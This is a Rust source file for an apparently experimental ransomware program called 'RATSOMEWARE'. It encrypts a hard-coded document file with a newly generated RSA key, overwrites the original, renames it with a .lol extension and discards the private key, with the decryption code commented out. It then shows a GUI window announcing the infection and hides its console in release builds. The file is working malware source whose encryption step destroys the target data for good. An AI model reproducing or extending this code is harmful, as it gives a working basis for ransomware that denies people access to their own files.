#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
#![allow(rustdoc::missing_crate_level_docs)]

use std::{
    fs::{self},
    path::Path,
};

use rsa::{Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey};

struct MyApp {
    name: String,
    age: u32,
}

impl Default for MyApp {
    fn default() -> Self {
        Self {
            name: "Arthur".to_owned(),
            age: 42,
        }
    }
}

impl eframe::App for MyApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        egui::CentralPanel::default().show(ctx, |ui| {
            ui.heading("YOU JUST GOT INFECTED WITH THE RATSOMEWARE VIRUS");
            ui.horizontal(|ui| {
                ui.label("ONE of your document files has been permanently encrypted!");
            });
        });
    }
}

#[tokio::main]
async fn main() -> eframe::Result {
    let file = Path::new("/home/Kathy/Documents/encrypt_this.txt");
    let new_file = Path::new("/home/Kathy/Documents/encrypt_this.txt.lol");
    let file_contents = fs::read(file).unwrap();

    let mut rng = rand::thread_rng();
    let bits = 2048;
    let priv_key = RsaPrivateKey::new(&mut rng, bits).expect("Failed to generate a private key");
    let pub_key = RsaPublicKey::from(&priv_key);

    let enc_data = pub_key
        .encrypt(&mut rng, Pkcs1v15Encrypt, &file_contents[..])
        .expect("Failed to encrypt");

    let _ = fs::write(file, enc_data).expect("Couldn't write to file");
    let _ = fs::rename(file, new_file);

    /*    let dec_data = priv_key
    .decrypt(Pkcs1v15Encrypt, &enc_data)
    .expect("Failed to decrypt"); */

    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default().with_inner_size([320.0, 240.0]),
        ..Default::default()
    };

    eframe::run_native(
        "My egui app",
        options,
        Box::new(|cc| {
            egui_extras::install_image_loaders(&cc.egui_ctx);
            Ok(Box::<MyApp>::default())
        }),
    )
}
